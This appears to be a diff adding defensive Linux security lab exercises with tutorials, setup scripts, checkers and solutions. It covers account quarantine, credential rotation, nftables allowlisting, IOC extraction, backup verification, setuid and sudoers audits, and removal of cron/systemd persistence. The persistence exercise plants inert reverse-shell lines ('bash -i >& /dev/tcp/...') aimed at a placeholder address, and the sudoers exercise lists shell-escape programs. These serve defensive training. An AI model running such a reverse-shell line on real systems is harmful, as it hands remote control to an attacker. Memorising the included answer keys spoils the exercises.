@@ -1,0 +1,857 @@
+track: defensive
+module: Response & recovery
+profile: offsec
+order: 4
+exercises:
+
+- id: sec-026
+  title: Quarantine a compromised account
+  difficulty: 2
+  kind: fix
+  tags: [accounts, containment, incident]
+  tutorial: |
+    **Concept.** Containing a compromised account means stopping every way it can be used while keeping the account and its files intact for forensics. Deleting it destroys evidence and frees its UID for reuse.
+
+    **Read up on:**
+    - `man usermod` — options that disable authentication and change a login shell
+    - `passwd -S` and `chage -l` — inspect lock and expiry state
+    - `/etc/shadow` — what the fields mean, including the expiry date
+    - `nologin` — a shell that refuses interactive sessions
+  scenario: |
+    The security team suspects one account has been taken over. Its name is in
+    **`/lab/suspect.txt`**.
+
+    **Quarantine** that account, but **do not delete** it or its home directory; the
+    investigators need them untouched. When you are done, the account must have:
+
+    - password authentication disabled,
+    - an account expiry date in the past,
+    - no interactive login shell.
+
+    Other users must not be affected.
+  hints:
+    - "`usermod` can do all three jobs, and each has its own option."
+    - "An expiry of day 1 (1970-01-02) is long past: `usermod -e 1`."
+    - "`passwd -S USER` should report `L` once the password is locked."
+  solution: |
+    ```bash
+    U=$(cat /lab/suspect.txt)
+    sudo usermod -L -e 1 -s /usr/sbin/nologin "$U"
+    ```
+  setup: |
+    mkdir -p /srv/kl/home
+    while :; do
+      U="contractor$((RANDOM % 900 + 100))"; C="analyst$((RANDOM % 900 + 100))"
+      id "$U" >/dev/null 2>&1 || id "$C" >/dev/null 2>&1 || break
+    done
+    for n in "$U" "$C"; do
+      useradd -M -d "/srv/kl/home/$n" -s /bin/bash "$n"
+      echo "$n:Winter2026!" | chpasswd
+      mkdir -p "/srv/kl/home/$n"
+      echo "work notes of $n" > "/srv/kl/home/$n/notes.txt"
+      chown -R "$n": "/srv/kl/home/$n"
+    done
+    echo "$U" > "$KL_STATE/answer"
+    echo "$C" > "$KL_STATE/other"
+    id -u "$U" > "$KL_STATE/uid"
+    echo "$U" | lab_file suspect.txt
+  check: |
+    U=$(cat $KL_STATE/answer); C=$(cat $KL_STATE/other); UID0=$(cat $KL_STATE/uid)
+    today=$(( $(date +%s) / 86400 ))
+    check "account still exists with its UID" '[ "$(id -u $U)" = "$UID0" ]'
+    check "password authentication is locked" '[ "$(passwd -S $U | cut -d" " -f2)" = L ]'
+    check "account expiry is in the past" 'e=$(getent shadow $U | cut -d: -f8); [ -n "$e" ] && [ "$e" -ge 0 ] && [ "$e" -le "$today" ]'
+    check "no interactive shell" 'getent passwd $U | cut -d: -f7 | grep -Eq "nologin|/false$"'
+    check "home directory preserved" '[ -f /srv/kl/home/$U/notes.txt ]'
+    check "other user untouched" '[ "$(passwd -S $C | cut -d" " -f2)" = P ] && getent passwd $C | grep -q /bin/bash'
+  solve: |
+    U=$(cat /lab/suspect.txt)
+    sudo usermod -L -e 1 -s /usr/sbin/nologin "$U"
+
+- id: sec-027
+  title: Rotate the leaked credential
+  difficulty: 2
+  kind: fix
+  tags: [secrets, rotation, sed, grep]
+  tutorial: |
+    **Concept.** Rotating a leaked secret means replacing it everywhere it was copied, not just in the obvious file. A single missed copy leaves the old credential alive, and a careless replace can damage similar-looking values.
+
+    **Read up on:**
+    - `grep -rlF` — list files containing a fixed string, hidden ones included
+    - `sed -i` — edit files in place
+    - `xargs` — feed a file list into another command
+    - `diff -r` — confirm that only the intended lines changed
+  scenario: |
+    A deployment token leaked in a chat. The incident report in
+    **`/lab/leak-report.txt`** names it. The replacement token is in
+    **`/lab/new-token.txt`**.
+
+    The application tree under **`/lab/app`** has copies of the leaked token in several
+    places. Make every occurrence use the **new** token.
+
+    The tree also holds tokens that look alike but belong to other services. Leave them
+    alone, and keep file permissions and everything else unchanged.
+  hints:
+    - "`grep -rlF TOKEN /lab/app` lists the files; dotfiles and hidden directories count."
+    - "Only an exact match of the leaked token should be replaced, not the shared prefix."
+    - "`xargs -r sed -i \"s/OLD/NEW/g\"` applies the substitution to the whole list."
+  solution: |
+    ```bash
+    OLD=$(grep -oE 'tok_live_[0-9a-f]+' /lab/leak-report.txt | head -1)
+    NEW=$(tr -d '[:space:]' < /lab/new-token.txt)
+    grep -rlF "$OLD" /lab/app | xargs -r sed -i "s/$OLD/$NEW/g"
+    ```
+  setup: |
+    python3 - <<'PY'
+    import os
+    h = lambda: os.urandom(8).hex()
+    old, new, other = "tok_live_" + h(), "tok_live_" + h(), "tok_live_" + h()
+    files = {
+        ".env": "APP_ENV=prod\nAPI_TOKEN=%s\nDB_HOST=db.internal\n" % old,
+        "config/settings.yaml": "service:\n  name: orders\n  token: %s\nbackup:\n  token: %s\n" % (old, old),
+        "config/payments.yaml": "gateway:\n  token: %s\n" % other,
+        "deploy/run.sh": "#!/bin/sh\ncurl -s -H \"Authorization: Bearer %s\" http://localhost/health\n" % old,
+        "docs/README.md": "# Orders\nExample call:\n\n    TOKEN=%s ./deploy/run.sh\n" % old,
+        ".config/ci/pipeline.conf": "[auth]\nkey = %s\nkeep = %s\n" % (old, other),
+    }
+    os.makedirs("/lab/app", exist_ok=True)
+    for p, c in files.items():
+        p = "/lab/app/" + p
+        os.makedirs(os.path.dirname(p), exist_ok=True)
+        open(p, "w").write(c)
+    os.chmod("/lab/app/deploy/run.sh", 0o755)
+    open("/lab/leak-report.txt", "w").write("Incident 4471\nLeaked credential: %s\nSource: chat paste, 2026-11-08\n" % old)
+    open("/lab/new-token.txt", "w").write(new + "\n")
+    st = "/var/lib/kubelab/"
+    open(st + "answer", "w").write(old + "\n")
+    open(st + "new", "w").write(new + "\n")
+    open(st + "other", "w").write(other + "\n")
+    n = sum(1 for c in files.values() if old in c)
+    open(st + "nfiles", "w").write("%d\n" % n)
+    open(st + "nlines", "w").write("%d\n" % sum(c.count("\n") for c in files.values()))
+    PY
+    chown -R "$(lab_user):" /lab
+  check: |
+    OLD=$(cat $KL_STATE/answer); NEW=$(cat $KL_STATE/new); OTHER=$(cat $KL_STATE/other)
+    N=$(cat $KL_STATE/nfiles); L=$(cat $KL_STATE/nlines)
+    check_not "leaked token gone from the tree" 'grep -rqF "$OLD" /lab/app'
+    check_eq "new token present in every affected file" "$(grep -rlF "$NEW" /lab/app 2>/dev/null | wc -l | tr -d ' ')" "$N"
+    check_eq "other service tokens untouched" "$(grep -rhF "$OTHER" /lab/app 2>/dev/null | wc -l | tr -d ' ')" 2
+    check_eq "no lines added or lost" "$(cat $(find /lab/app -type f) 2>/dev/null | wc -l | tr -d ' ')" "$L"
+    check "script is still executable" '[ -x /lab/app/deploy/run.sh ]'
+  solve: |
+    OLD=$(grep -oE 'tok_live_[0-9a-f]+' /lab/leak-report.txt | head -1)
+    NEW=$(tr -d '[:space:]' < /lab/new-token.txt)
+    grep -rlF "$OLD" /lab/app | xargs -r sed -i "s/$OLD/$NEW/g"
+
+- id: sec-028
+  title: An allowlist firewall for the server
+  difficulty: 4
+  kind: build
+  tags: [nftables, netns, allowlist, firewall]
+  tutorial: |
+    **Concept.** An allowlist firewall denies everything by default and permits only named source and port pairs. It must still let replies and loopback through, or the server breaks itself.
+
+    **Read up on:**
+    - `man nft` — tables, base chains, hooks and `policy drop`
+    - `ct state established,related` — admit replies to accepted traffic
+    - `ip saddr` with `tcp dport` — match one source and one port
+    - `ip netns exec` — run `nft` inside a namespace
+    - `nft list ruleset` — read back what is loaded
+  scenario: |
+    Server **`srv`** (10.70.0.2) listens on TCP ports 22, 80, 443 and 8080. Three hosts
+    share its segment: **`office`** (10.70.0.10), **`vendor`** (10.70.0.20) and
+    **`rogue`** (10.70.0.66).
+
+    **`/lab/allow.csv`** is the approved access list, one `source-ip,port` per line.
+    Using **nftables inside the `srv` namespace**, make the server accept exactly those
+    pairs and nothing else:
+
+    - every listed source can reach its listed port,
+    - every other connection attempt is blocked,
+    - replies and loopback traffic keep working.
+
+    Do not touch the VM's own firewall.
+  hints:
+    - "Create an `inet` table with an `input` chain hooked at `input` with `policy drop`."
+    - "Accept `iif lo` and `ct state established,related` before the specific rules."
+    - "One rule per CSV line: `ip saddr <ip> tcp dport <port> accept`."
+  solution: |
+    Generate one rule per line of the access list and load it into the namespace:
+
+    ```bash
+    {
+      echo 'table inet allowlist {'
+      echo ' chain input {'
+      echo '  type filter hook input priority filter; policy drop;'
+      echo '  iif lo accept'
+      echo '  ct state established,related accept'
+      while IFS=, read -r ip port; do
+        echo "  ip saddr $ip tcp dport $port accept"
+      done < /lab/allow.csv
+      echo ' }'
+      echo '}'
+    } | sudo ip netns exec srv nft -f -
+    ```
+  setup: |
+    netns_new srv office vendor rogue sw
+    ip -n sw link add br0 type bridge
+    ip -n sw link set br0 up
+    i=0
+    for pair in srv:2 office:10 vendor:20 rogue:66; do
+      n=${pair%:*}; o=${pair#*:}; i=$((i + 1))
+      netns_link "$n" eth0 sw "p$i"
+      ip -n sw link set "p$i" master br0
+      ip -n "$n" addr add "10.70.0.$o/24" dev eth0
+    done
+    python3 - <<'PY'
+    import random
+    ports = [22, 80, 443, 8080]
+    rows = [("10.70.0.10", p) for p in random.sample(ports, 2)]
+    rows.append(("10.70.0.20", random.choice(ports)))
+    txt = "".join("%s,%d\n" % r for r in rows)
+    open("/lab/allow.csv", "w").write(txt)
+    open("/var/lib/kubelab/allow", "w").write(txt)
+    PY
+    chown "$(lab_user):" /lab/allow.csv
+    on_reset 'systemctl stop kl-fwsvc 2>/dev/null; systemctl reset-failed kl-fwsvc 2>/dev/null; rm -f /var/lib/kubelab/allow'
+    systemd-run --quiet --unit=kl-fwsvc bash -c 'for p in 22 80 443 8080; do ip netns exec srv ncat -lk 10.70.0.2 $p & done; wait'
+    eventually 20 '[ "$(ip netns exec srv ss -ltnH | wc -l)" -ge 4 ]'
+  check: |
+    check "default input policy is drop" 'ip netns exec srv nft list ruleset 2>/dev/null | grep -q "policy drop"'
+    for c in office:10.70.0.10 vendor:10.70.0.20 rogue:10.70.0.66; do
+      ns=${c%%:*}; ip=${c#*:}
+      for p in 22 80 443 8080; do
+        if grep -qx "$ip,$p" "$KL_STATE/allow"; then
+          check "$ns -> $p is allowed" "ip netns exec $ns ncat -z -w2 10.70.0.2 $p"
+        else
+          check_not "$ns -> $p is blocked" "ip netns exec $ns ncat -z -w1 10.70.0.2 $p"
+        fi
+      done
+    done
+  solve: |
+    {
+      echo 'table inet allowlist {'
+      echo ' chain input {'
+      echo '  type filter hook input priority filter; policy drop;'
+      echo '  iif lo accept'
+      echo '  ct state established,related accept'
+      while IFS=, read -r ip port; do
+        echo "  ip saddr $ip tcp dport $port accept"
+      done < /lab/allow.csv
+      echo ' }'
+      echo '}'
+    } | sudo ip netns exec srv nft -f -
+
+- id: sec-029
+  title: Carve the indicators out of mixed logs
+  difficulty: 2
+  kind: build
+  tags: [ioc, logs, grep, sed]
+  tutorial: |
+    **Concept.** Indicators of compromise are the concrete addresses and file hashes that tie log lines to an intrusion. Every log has its own format, so extraction means finding the right field in each, not grepping for anything that looks like an IP.
+
+    **Read up on:**
+    - `grep -o` with `-E` — print only the matching part of a line
+    - `sed -n 's/.../\1/p'` — capture one field
+    - `awk` — pick a column from a fixed layout
+    - `sort -u` — a unique, ordered list
+  scenario: |
+    The threat report **`/lab/report.txt`** describes an implant that beacons to a URL
+    path, and tells you how the antivirus log marks the malicious files. Logs are in
+    **`/lab/logs`** (a web server log, a proxy log and an antivirus log; each has its
+    own format).
+
+    Produce two indicator lists, each **unique and sorted**, one value per line:
+
+    - **`/lab/iocs-ips.txt`**: the **client** addresses that requested the beacon path
+      in either the web or proxy log (not the destination addresses),
+    - **`/lab/iocs-hashes.txt`**: the SHA-256 hashes of the files the antivirus flagged.
+  hints:
+    - "In the proxy log the client is the `client=` field; `dst=` is the other end."
+    - "The web log has the client address as its first field."
+    - "A similar-looking path with a different name is not the implant."
+    - "`grep -oE '[0-9a-f]{64}'` extracts a SHA-256 hash from a line."
+  solution: |
+    ```bash
+    cd /lab/logs
+    P=$(grep -oE '/static/sync/[0-9a-f]+\.js' ../report.txt)
+    { grep -F "$P " access.log | awk '{print $1}'
+      grep -F "url=$P" proxy.log | sed 's/.*client=\([0-9.]*\).*/\1/'
+    } | sort -u > ../iocs-ips.txt
+    grep 'verdict=MALWARE' av.log | grep -oE '[0-9a-f]{64}' | sort -u > ../iocs-hashes.txt
+    ```
+  setup: |
+    python3 - <<'PY'
+    import os, random
+    r = random.randint
+    ip = lambda p: "%s.%d" % (p, r(2, 250))
+    bad = set()
+    while len(bad) < 5:
+        bad.add(ip("203.0.113"))
+    bad = sorted(bad)
+    good = list({ip("198.51.100") for _ in range(10)})
+    beacon = "/static/sync/%s.js" % os.urandom(4).hex()
+    decoy = "/static/sync/%s.js" % os.urandom(4).hex()
+    stamp = lambda: "%02d:%02d:%02d" % (r(0, 23), r(0, 59), r(0, 59))
+    acc, prx = [], []
+    for b in bad[:3]:
+        for _ in range(r(2, 4)):
+            acc.append('%s - - [09/Nov/2026:%s +0000] "GET %s HTTP/1.1" 200 %d' % (b, stamp(), beacon, r(200, 900)))
+    for b in bad[2:]:
+        for _ in range(r(2, 3)):
+            prx.append("2026-11-09T%s client=%s dst=192.0.2.%d url=%s" % (stamp(), b, r(2, 250), beacon))
+    for g in good:
+        for _ in range(r(1, 3)):
+            u = random.choice([decoy, "/index.html", "/api/orders", "/static/app.js"])
+            acc.append('%s - - [09/Nov/2026:%s +0000] "GET %s HTTP/1.1" 200 %d' % (g, stamp(), u, r(200, 9000)))
+            prx.append("2026-11-09T%s client=%s dst=192.0.2.%d url=%s" % (stamp(), g, r(2, 250), random.choice([decoy, "/index.html", "/api/orders"])))
+    mal = sorted({os.urandom(32).hex() for _ in range(6)})
+    cln = [os.urandom(32).hex() for _ in range(8)]
+    av = []
+    for hsh in mal + [mal[0]]:
+        av.append("2026-11-09T%s scan file=/var/tmp/%s sha256=%s verdict=MALWARE" % (stamp(), os.urandom(3).hex(), hsh))
+    for hsh in cln:
+        av.append("2026-11-09T%s scan file=/srv/www/%s sha256=%s verdict=CLEAN" % (stamp(), os.urandom(3).hex(), hsh))
+    os.makedirs("/lab/logs", exist_ok=True)
+    for name, lines in (("access.log", acc), ("proxy.log", prx), ("av.log", av)):
+        random.shuffle(lines)
+        open("/lab/logs/" + name, "w").write("\n".join(lines) + "\n")
+    open("/lab/report.txt", "w").write(
+        "Threat report TR-218\n\nThe implant beacons with GET requests to %s\n"
+        "Files the antivirus flags carry the verdict MALWARE in av.log.\n" % beacon)
+    st = "/var/lib/kubelab/"
+    open(st + "ips.exp", "w").write("\n".join(bad) + "\n")
+    open(st + "hashes.exp", "w").write("\n".join(mal) + "\n")
+    PY
+    chown -R "$(lab_user):" /lab
+    on_reset 'rm -f /var/lib/kubelab/ips.exp /var/lib/kubelab/hashes.exp'
+  check: |
+    norm() { tr -d '\r' 2>/dev/null <"$1" | sed 's/[[:space:]]*$//' | grep -v '^$' | LC_ALL=C sort -u; }
+    check_eq "client IP indicators" "$(norm /lab/iocs-ips.txt)" "$(cat $KL_STATE/ips.exp)"
+    check_eq "malware hash indicators" "$(norm /lab/iocs-hashes.txt)" "$(cat $KL_STATE/hashes.exp)"
+  solve: |
+    cd /lab/logs
+    P=$(grep -oE '/static/sync/[0-9a-f]+\.js' ../report.txt)
+    { grep -F "$P " access.log | awk '{print $1}'
+      grep -F "url=$P" proxy.log | sed 's/.*client=\([0-9.]*\).*/\1/'
+    } | sort -u > ../iocs-ips.txt
+    grep 'verdict=MALWARE' av.log | grep -oE '[0-9a-f]{64}' | sort -u > ../iocs-hashes.txt
+
+- id: sec-030
+  title: Which backups can you trust?
+  difficulty: 2
+  kind: build
+  tags: [backup, integrity, sha256sum, recovery]
+  tutorial: |
+    **Concept.** A backup is only useful if it restores intact. Checksums recorded at backup time prove that an archive is unchanged, and they catch damage that a file listing or even a decompression test would miss.
+
+    **Read up on:**
+    - `sha256sum -c` — verify files against a checksum list
+    - `--quiet` and `--status` — control the report and exit code
+    - `gzip -t` and `tar -tzf` — structural tests, and what they cannot prove
+    - shell globbing — check many sidecar files at once
+  scenario: |
+    **`/lab/backup`** holds nightly database archives, each with a `.sha256` file written
+    when the archive was made.
+
+    Before restoring anything, work out which archives are **no longer intact**. Write
+    their file names (the archives, not the checksum files), one per line and sorted, to
+    **`/lab/bad.txt`**.
+
+    Do not modify or delete anything in `/lab/backup`.
+  hints:
+    - "Each `.sha256` file is in the format `sha256sum -c` reads."
+    - "Run the check from inside `/lab/backup` so the names resolve."
+    - "An archive can pass `gzip -t` and still not match its recorded hash."
+  solution: |
+    ```bash
+    cd /lab/backup
+    sha256sum -c --quiet *.sha256 2>/dev/null | grep ': FAILED$' | cut -d: -f1 | sort > /lab/bad.txt
+    ```
+  setup: |
+    python3 - <<'PY'
+    import os, io, tarfile, hashlib, random
+    os.makedirs("/lab/backup", exist_ok=True)
+    def mk(path, tag):
+        data = ("INSERT INTO orders VALUES (%s);\n" % tag * 60).encode() + os.urandom(300).hex().encode()
+        with tarfile.open(path, "w:gz") as t:
+            ti = tarfile.TarInfo("dump.sql")
+            ti.size = len(data)
+            t.addfile(ti, io.BytesIO(data))
+    days = sorted(random.sample(range(1, 29), 7))
+    names = ["db-2026-10-%02d.tar.gz" % d for d in days]
+    for n in names:
+        p = "/lab/backup/" + n
+        mk(p, n)
+        h = hashlib.sha256(open(p, "rb").read()).hexdigest()
+        open(p + ".sha256", "w").write("%s  %s\n" % (h, n))
+    bad = random.sample(names, 3)
+    mk("/lab/backup/" + bad[0], "tampered-" + bad[0])
+    b = open("/lab/backup/" + bad[1], "rb").read()
+    open("/lab/backup/" + bad[1], "wb").write(b[:-30])
+    b = bytearray(open("/lab/backup/" + bad[2], "rb").read())
+    b[len(b) // 2] ^= 0xFF
+    open("/lab/backup/" + bad[2], "wb").write(bytes(b))
+    open("/var/lib/kubelab/answer", "w").write("\n".join(sorted(bad)) + "\n")
+    PY
+    chown -R "$(lab_user):" /lab
+  check: |
+    got=$(tr -d '\r' 2>/dev/null </lab/bad.txt | sed 's/[[:space:]]*$//' | grep -v '^$' | LC_ALL=C sort -u)
+    check_eq "damaged archives listed" "$got" "$(cat $KL_STATE/answer)"
+    check "backups left untouched" '[ "$(ls /lab/backup | wc -l)" = 14 ]'
+  solve: |
+    cd /lab/backup
+    sha256sum -c --quiet *.sha256 2>/dev/null | grep ': FAILED$' | cut -d: -f1 | sort > /lab/bad.txt
+
+- id: sec-031
+  title: Setuid drift against the baseline
+  difficulty: 3
+  kind: build
+  tags: [setuid, baseline, find, awk]
+  tutorial: |
+    **Concept.** The setuid bit makes a program run with its owner's privileges, so any change to the set of setuid files is worth explaining. Comparing the current state to a recorded baseline shows additions, removals and permission drift.
+
+    **Read up on:**
+    - `find -perm -4000` — match files with the setuid bit set
+    - `find -printf '%m %p\n'` — print the octal mode with the path
+    - `sort` and `join` — line up two listings by path
+    - `awk` with arrays — compare keyed data from two files
+  scenario: |
+    A copy of a server's filesystem is in **`/srv/kl/rootfs`**. **`/lab/baseline.txt`**
+    lists the setuid files recorded at install time, one `MODE PATH` per line (for
+    example `4755 /srv/kl/rootfs/usr/bin/su`).
+
+    Compare the tree to the baseline, looking at the **setuid bit only**. Write
+    **`/lab/changes.txt`** with one line per difference, sorted by path:
+
+    - `ADDED PATH`: setuid now, not in the baseline,
+    - `REMOVED PATH`: in the baseline, but no longer setuid (or gone),
+    - `CHANGED PATH`: still setuid, but the mode differs from the baseline.
+  hints:
+    - "`find /srv/kl/rootfs -type f -perm -4000 -printf '%m %p\\n'` gives the current state."
+    - "Key an `awk` array on the path field, one for each file."
+    - "Setgid files (mode starting with 2) are not part of this comparison."
+  solution: |
+    ```bash
+    find /srv/kl/rootfs -type f -perm -4000 -printf '%m %p\n' > /tmp/now.txt
+    awk 'NR==FNR {b[$2]=$1; next} {n[$2]=$1}
+         END {
+           for (p in n) { if (!(p in b)) print "ADDED", p; else if (b[p] != n[p]) print "CHANGED", p }
+           for (p in b) if (!(p in n)) print "REMOVED", p
+         }' /lab/baseline.txt /tmp/now.txt | sort -k2 > /lab/changes.txt
+    ```
+  setup: |
+    python3 - <<'PY'
+    import os, random
+    root = "/srv/kl/rootfs"
+    base = random.sample(["usr/bin/su", "usr/bin/mount", "usr/bin/passwd", "usr/bin/chsh", "usr/bin/pkexec",
+                          "bin/ping", "usr/bin/newgrp", "sbin/mount.nfs"], 6)
+    extra = ["opt/tools/.cache-helper", "usr/lib/dbus/launcher", "var/tmp/.x11"]
+    plain = ["bin/ls", "bin/cat", "usr/bin/env", "usr/bin/less", "sbin/ip", "usr/bin/wall"]
+    for rel in base + extra + plain:
+        p = os.path.join(root, rel)
+        os.makedirs(os.path.dirname(p), exist_ok=True)
+        open(p, "w").write("#!/bin/sh\n# inert stand-in %s\n" % rel)
+    for d, _, _ in os.walk(root):
+        os.chmod(d, 0o755)
+    random.shuffle(base)
+    added = random.choice(extra)
+    drift, cleared, gone, keep = base[0], base[1], base[2], base[3:]
+    for rel in plain:
+        os.chmod(os.path.join(root, rel), 0o755)
+    for rel in extra:
+        os.chmod(os.path.join(root, rel), 0o755)
+    for rel in keep:
+        os.chmod(os.path.join(root, rel), 0o4755)
+    os.chmod(os.path.join(root, drift), 0o4777)
+    os.chmod(os.path.join(root, cleared), 0o755)
+    os.remove(os.path.join(root, gone))
+    os.chmod(os.path.join(root, added), 0o4755)
+    other = [e for e in extra if e != added][0]
+    os.chmod(os.path.join(root, other), 0o2755)
+    lines = ["4755 %s/%s" % (root, r) for r in base]
+    open("/lab/baseline.txt", "w").write("\n".join(sorted(lines, key=lambda l: l.split()[1])) + "\n")
+    exp = ["ADDED %s/%s" % (root, added), "CHANGED %s/%s" % (root, drift),
+           "REMOVED %s/%s" % (root, cleared), "REMOVED %s/%s" % (root, gone)]
+    open("/var/lib/kubelab/answer", "w").write("\n".join(sorted(exp, key=lambda l: l.split()[1])) + "\n")
+    PY
+    chown "$(lab_user):" /lab/baseline.txt
+    on_reset 'rm -f /var/lib/kubelab/answer'
+  check: |
+    got=$(tr -d '\r' 2>/dev/null </lab/changes.txt | awk 'NF{print $1, $2}' | LC_ALL=C sort -k2)
+    check_eq "setuid differences reported" "$got" "$(cat $KL_STATE/answer)"
+  solve: |
+    find /srv/kl/rootfs -type f -perm -4000 -printf '%m %p\n' > /tmp/now.txt
+    awk 'NR==FNR {b[$2]=$1; next} {n[$2]=$1}
+         END {
+           for (p in n) { if (!(p in b)) print "ADDED", p; else if (b[p] != n[p]) print "CHANGED", p }
+           for (p in b) if (!(p in n)) print "REMOVED", p
+         }' /lab/baseline.txt /tmp/now.txt | sort -k2 > /lab/changes.txt
+
+- id: sec-032
+  title: Audit the sudoers rules
+  difficulty: 3
+  kind: build
+  tags: [sudo, audit, privilege-escalation]
+  tutorial: |
+    **Concept.** A sudo rule is only as safe as the programs it allows. Editors, pagers and interpreters can open a shell, and an alias can hide a dangerous command several lines away from the rule that uses it.
+
+    **Read up on:**
+    - `man sudoers` — user specs, `Cmnd_Alias` and the `NOPASSWD:` tag
+    - `ls /etc/sudoers.d` — rules are often split over several files
+    - `grep -rn` — follow an alias name through every file
+    - GTFOBins — which common programs allow escaping to a shell
+  scenario: |
+    A copy of a server's sudo configuration is in **`/lab/sudoers.d`** (several files).
+
+    A rule is **risky** when it lets a user or group run `ALL` commands, or any of these
+    programs: `vim`, `less`, `find`, `awk`, `python3`, `bash`, `sh`, `env`, `tar`
+    (matched on the program itself, whatever its arguments).
+
+    Write the **names** of every user or group with at least one risky rule, directly or
+    through an alias, to **`/lab/risky.txt`**: one per line, group names with their
+    leading `%`. Commented-out rules do not count.
+  hints:
+    - "Read the alias definitions first; a rule may name only the alias."
+    - "A program such as `findlogs` merely starts with the name of a risky one."
+    - "Ignore lines starting with `#`."
+  solution: |
+    Read the files by hand, or script it. The key points: expand `Cmnd_Alias`
+    definitions, compare each command's program name (the first word's basename) to the
+    list, and treat `ALL` as risky. A decoy such as `/usr/local/bin/findlogs` is not
+    `find`, and a commented rule grants nothing.
+
+    ```bash
+    grep -rvE '^\s*#|^\s*$' /lab/sudoers.d
+    ```
+  setup: |
+    python3 - <<'PY'
+    import os, random
+    names = random.sample(["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan"], 6)
+    u0, u1, u2, u3, u4, u5 = names
+    grp = "%ops" + str(random.randint(2, 9))
+    d = "/lab/sudoers.d"
+    os.makedirs(d, exist_ok=True)
+    files = {
+        "10-aliases": "Cmnd_Alias SVC = /usr/bin/systemctl restart nginx, /usr/bin/systemctl status nginx\n"
+                      "Cmnd_Alias DIAG = /usr/bin/tail -n 100 /var/log/syslog, /usr/bin/find /var/log -name *.gz\n",
+        "20-staff": "# staff access\n"
+                    "%s ALL=(ALL) NOPASSWD: ALL\n"
+                    "%s ALL=(root) SVC\n"
+                    "%s ALL=(root) DIAG\n"
+                    "%s ALL=(root) NOPASSWD: /usr/bin/vim /etc/hosts\n"
+                    "%s ALL=(root) /usr/local/bin/findlogs, /usr/bin/systemctl reload nginx\n"
+                    "# %s ALL=(ALL) ALL\n" % (u0, u1, u2, u3, u4, u5),
+        "30-ops": "Defaults:%s !requiretty\n"
+                  "%s ALL=(root) /usr/bin/python3 /opt/scripts/report.py\n" % (grp, grp),
+    }
+    for n, c in files.items():
+        open(d + "/" + n, "w").write(c)
+    exp = sorted([u0, u2, u3, grp])
+    open("/var/lib/kubelab/answer", "w").write("\n".join(exp) + "\n")
+    PY
+    chown -R "$(lab_user):" /lab
+    on_reset 'rm -f /var/lib/kubelab/answer'
+  check: |
+    got=$(tr -d '\r' 2>/dev/null </lab/risky.txt | sed 's/[[:space:]]*$//' | grep -v '^$' | LC_ALL=C sort -u)
+    check_eq "risky users and groups listed" "$got" "$(LC_ALL=C sort -u $KL_STATE/answer)"
+  solve: |
+    python3 - <<'PY'
+    import glob, re
+    RISKY = {"vim", "less", "find", "awk", "python3", "bash", "sh", "env", "tar"}
+    aliases, rules = {}, []
+    for f in sorted(glob.glob("/lab/sudoers.d/*")):
+        for line in open(f):
+            line = line.strip()
+            if not line or line.startswith("#") or line.startswith("Defaults"):
+                continue
+            if line.startswith("Cmnd_Alias"):
+                name, rest = line[len("Cmnd_Alias"):].split("=", 1)
+                aliases[name.strip()] = [c.strip() for c in rest.split(",")]
+            else:
+                who, rest = line.split(None, 1)
+                cmds = rest.split("=", 1)[1]
+                cmds = re.sub(r"^\s*\([^)]*\)\s*", "", cmds)
+                cmds = re.sub(r"\b(NO)?PASSWD:|\bSETENV:", "", cmds)
+                rules.append((who, [c.strip() for c in cmds.split(",")]))
+    out = set()
+    for who, cmds in rules:
+        for c in cmds:
+            for x in aliases.get(c, [c]):
+                prog = x.split()[0].rsplit("/", 1)[-1] if x else ""
+                if x == "ALL" or prog in RISKY:
+                    out.add(who)
+    open("/lab/risky.txt", "w").write("\n".join(sorted(out)) + "\n")
+    PY
+
+- id: sec-033
+  title: A callback hiding in cron and systemd
+  difficulty: 3
+  kind: fix
+  tags: [persistence, cron, systemd, reverse-shell]
+  tutorial: |
+    **Concept.** Attackers keep access by planting scheduled jobs and services that call home. Finding them means searching the places that run things on a schedule or at boot, then removing every copy, including enablement links.
+
+    **Read up on:**
+    - `/etc/cron.d` and `/etc/systemd/system` — where persistence is planted
+    - `grep -r` — search config trees for a telltale string
+    - `systemctl cat` and `systemctl disable` — inspect a unit and undo its enablement
+    - `systemctl daemon-reload` — refresh after deleting unit files
+  scenario: |
+    An alert fired on a pattern that looks like a **reverse shell** (a shell wired to a
+    remote address) somewhere in this host's scheduled jobs or services. The commands
+    here are inert stand-ins and will not actually connect anywhere.
+
+    Find the persistence and clean it up completely:
+
+    - remove the malicious cron job **and** the systemd unit, including anything that
+      enables the unit,
+    - leave the legitimate jobs and units alone,
+    - write the remote **address and port** it calls to as `IP:PORT` to **`/lab/c2.txt`**.
+  hints:
+    - "There are two places to look. Search both for the string that gives it away."
+    - "A unit can mention `tcp` innocently; the shell-redirect form `/dev/tcp/` is the tell."
+    - "A unit that is enabled leaves a symlink under a `.wants` directory."
+  solution: |
+    ```bash
+    sudo grep -rn '/dev/tcp/' /etc/cron.d /etc/systemd/system
+    sudo grep -rhoE '/dev/tcp/[0-9.]+/[0-9]+' /etc/cron.d /etc/systemd/system | head -1 \
+      | sed 's#/dev/tcp/##; s#/#:#' > /lab/c2.txt
+    sudo systemctl disable kl-netmon.service
+    sudo rm -f /etc/systemd/system/kl-netmon.service /etc/cron.d/kl-sysstat
+    sudo systemctl daemon-reload
+    ```
+  setup: |
+    IP="203.0.113.$((RANDOM % 200 + 10))"; PORT=$((RANDOM % 5000 + 4000))
+    echo "$IP:$PORT" > "$KL_STATE/answer"
+    on_reset 'systemctl disable kl-netmon.service 2>/dev/null; rm -f /etc/systemd/system/kl-*.service /etc/systemd/system/*.wants/kl-*.service; systemctl daemon-reload 2>/dev/null'
+    cat > /etc/systemd/system/kl-netmon.service <<EOF
+    [Unit]
+    Description=Network monitor helper
+
+    [Service]
+    Type=oneshot
+    ExecStart=/bin/sh -c 'echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1" >/dev/null'
+
+    [Install]
+    WantedBy=multi-user.target
+    EOF
+    cat > /etc/systemd/system/kl-portcheck.service <<'EOF'
+    [Unit]
+    Description=Check TCP port health
+
+    [Service]
+    Type=oneshot
+    ExecStart=/bin/true
+
+    [Install]
+    WantedBy=multi-user.target
+    EOF
+    cat > /etc/systemd/system/kl-metrics.service <<'EOF'
+    [Unit]
+    Description=Push metrics
+
+    [Service]
+    Type=oneshot
+    ExecStart=/bin/true
+    EOF
+    cat > /etc/cron.d/kl-sysstat <<EOF
+    */5 * * * * root echo 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' >/dev/null
+    EOF
+    cat > /etc/cron.d/kl-logsweep <<'EOF'
+    0 3 * * * root /bin/true
+    EOF
